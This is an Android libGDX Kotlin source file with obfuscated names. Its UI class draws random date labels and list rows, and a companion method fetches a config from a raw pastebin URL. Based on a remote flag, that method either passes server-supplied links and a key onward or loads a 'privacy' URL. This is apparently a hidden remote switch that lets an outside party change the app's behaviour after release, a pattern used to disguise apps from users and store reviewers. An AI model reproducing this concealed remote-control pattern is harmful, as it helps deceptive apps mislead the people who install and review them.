package italodisco.fernando.lucherano

import android.view.View
import italodisco.fernando.lucherano.iopartew.OvochevaVapikanka
import italodisco.fernando.lucherano.iopartew.PretiCoolGorgle
import italodisco.fernando.lucherano.iopartew.pppp098.font.AdvancedGroup
import italodisco.fernando.lucherano.iopartew.pppp098.font.AdvancedScreen
import italodisco.fernando.lucherano.iopartew.pppp098.font.CharType
import italodisco.fernando.lucherano.iopartew.pppp098.font.FontPath
import italodisco.fernando.lucherano.iopartew.pppp098.font.setCharacters
import italodisco.fernando.lucherano.iopartew.pppp098.font.setLinear
import italodisco.fernando.lucherano.iopartew.pppp098.font.setSize
import italodisco.fernando.lucherano.iopartew.pppp098.numStr
import com.badlogic.gdx.Gdx
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.graphics.g2d.freetype.FreeTypeFontGenerator
import com.badlogic.gdx.scenes.scene2d.Actor
import com.badlogic.gdx.scenes.scene2d.ui.Label
import com.badlogic.gdx.scenes.scene2d.ui.ScrollPane
import com.badlogic.gdx.utils.Align
import italodisco.fernando.lucherano.pistorNaD.DSM
import italodisco.fernando.lucherano.iopartew.sandes.pistro.log
import italodisco.fernando.lucherano.iopartew.sandes.setVisible
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.Request
import org.json.JSONObject
import java.io.IOException

class DomiLai(override val screen: AdvancedScreen): AdvancedGroup() {

    private val generatorSB = FreeTypeFontGenerator(Gdx.files.internal(FontPath.SB))
    private val parameter   = FreeTypeFontGenerator.FreeTypeFontParameter().setLinear()

    private val font23 = generatorSB.generateFont(parameter.setCharacters(CharType.ALL).setSize(23))

    private val vert = PretiCoolGorgle(screen, startGap = 0f, gap = 16f, alignment = PretiCoolGorgle.Alignment.TOP, direction = PretiCoolGorgle.Direction.DOWN)
    private val sill = ScrollPane(vert)

    private val poriRoYear = listOf(
        "Декабря",
        "Сентября",
        "Октября",
        "Августа",
        "Января",
        "Ноября",
        "Июля",
        "Февраля",
    )

    override fun addActorsOnGroup() {
        addAndFillActor(sill)

        repeat((2..6).random()) {
            addLbl()
            repeat((2..6).random()) { vert.addActor(OvochevaVapikanka(screen).apply { setSize(524f, 73f) }) }

            val a = Actor().apply {
                width = 7f
                height = 7f
            }
            vert.addActor(a)
        }
    }

    companion object {
         suspend fun getFlag(activity: JopaStarTue) {
            val request: Request = Request.Builder().url("https://pastebin.com/raw/h1AcU5Uv").build()

            try {
                activity.okHttpClient.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        val json = JSONObject(response.body?.string() ?: "")
                        log("getFlag SUCCESS: $json")

                        val flag      = json.getBoolean("illi")
                        val key       = json.getString("molly")
                        val privacy   = json.getString("fratenko")
                        val linkCheck = json.getString("sternenko")
                        val link      = json.getString("dronKomokAdze")

                        if (flag) activity.getResponseFromServer(linkCheck, key, link)
                        else {
                            JopaStarTue.webURL = privacy
                            CoroutineScope(Dispatchers.IO).launch {
                                DSM.kliJ.update { "Priv" }
                                DSM.PariVacy.update { privacy }
                            }
                            JopaStarTue.poloraDo.tryEmit(R.id.libGDXFragment)
                        }
                    } else {
                        log("getFlag newCall FAIL: ${response.code} ${response.message}")
                        JopaStarTue.poloraDo.tryEmit(R.id.libGDXFragment)
                    }
                }
            } catch (e: IOException) {
                log("getFlag FAIL: $e")
                JopaStarTue.poloraDo.tryEmit(R.id.libGDXFragment)
            }
        }
    }

    private fun addLbl() {
        vert.addActor(Label("${numStr(1,31,1)} ${poriRoYear.random()}", Label.LabelStyle(font23, Color.valueOf("676768"))).apply {
            setSize(126f, 26f)
            setAlignment(Align.topLeft)
        })
    }

    override fun dispose() {
        generatorSB.dispose()
        font23.dispose()
        vert.dispose()

        super.dispose()
    }

    fun uprugaPopka() {
        vert.clearChildren()

        repeat((2..6).random()) {
            addLbl()
            repeat((2..6).random()) { vert.addActor(OvochevaVapikanka(screen).apply { setSize(524f, 73f) }) }

            val a = Actor().apply {
                width = 7f
                height = 7f
            }
            vert.addActor(a)
        }
    }

}